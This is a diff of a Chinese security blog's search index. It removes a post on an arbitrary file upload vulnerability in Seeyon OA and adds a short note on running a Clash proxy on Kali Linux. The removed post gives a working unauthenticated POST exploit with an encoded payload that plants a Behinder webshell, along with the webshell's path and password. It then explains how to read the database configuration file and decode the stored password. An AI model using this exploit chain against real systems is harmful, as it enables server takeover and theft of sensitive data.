class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>
+
+<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
+<p>解密脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<p>得到密码后即可连接数据库造成敏感信息泄露</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>记录kali如何挂梯子</title>
+    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
+    <content><![CDATA[<p>记录下kali如何挂梯子</p>
+<span id="more"></span>
+
+
+
+<p><strong>前言</strong></p>
+<blockquote>
+<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
+</blockquote>
+<p><strong>步骤</strong></p>
+<p>我们先创建clash目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
+
+<p>然后我们下载压缩包文件，选择第一个</p>
+<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
+<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
+<p>成功打开后，我们可以汉化一下</p>
+<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
+<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
+<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
+<p>最后就是设置浏览器代理</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
+<p>设置好后，就能成功使用魔法访问外网</p>
+<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
+]]></content>
+      <categories>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -3454,52 +3503,5 @@
       <tags>
         <tag>NSSCTF</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>致远OA-ajax.do任意文件上传漏洞</title>
-    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
-<span id="more"></span>
-
-<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
-<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
-</blockquote>
-<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>
-
-<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>
-
-<p>如果出现异常页面，则漏洞可能存在</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
-<p>POC如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
-
-<p>如果漏洞利用成功，回显如下界面</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
-<p>利用失败的话回显如下，或者页面空白，警告等</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
-<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
-<p>webshell路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>
-
-<p>连接密码：rebeyond</p>
-<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
-<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
-<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
-<p>致远OA数据库配置文件路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>
-
-<p>访问可以找到密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span class="line">ctpDataSource.maxCount=2000</span><br></pre></td></tr></table></figure>
-
-<p>不过这里的密码是经过加密的，<code>1.0</code>表示左偏移一位，对应解密成明文</p>
-<p>解密脚本如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">a=&quot;&quot;</span><br><span class="line">password = &quot;Ab123456&quot;</span><br><span class="line">for i in password:</span><br><span class="line">    a+= chr(ord(i) -1 )</span><br><span class="line"></span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
-
-<p>得到密码后即可连接数据库造成敏感信息泄露</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
   </entry>
 </search>
